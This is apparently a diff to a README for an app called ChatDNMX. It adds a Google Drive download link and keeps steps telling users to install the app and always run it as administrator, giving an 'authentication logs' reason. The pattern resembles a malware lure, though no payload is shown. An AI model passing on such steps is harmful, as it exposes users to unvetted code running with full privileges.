@@ -12,11 +12,12 @@ It would help me a lot.
 
 
 ** INSTRUCTIONS ** :-
-1.) Install the setup.
-2.) Go through the setup very carefully.
-3.) Locate ChatDNMX.
-4.) Run it as an administrator(Do this every time, this is run as an administrator to create logs for authentication).
-5.) Enjoy using ChatDNMX
+1.) Download the app from this link: https://drive.google.com/file/d/1Lviz2Lw_DcxeNqyTgicG29mqXcSUvYr4/view?usp=sharing
+2.) Install the setup.
+3.) Go through the setup very carefully.
+4.) Locate ChatDNMX.
+5.) Run it as an administrator(Do this every time, this is run as an administrator to create logs for authentication).
+6.) Enjoy using ChatDNMX
 
 
 
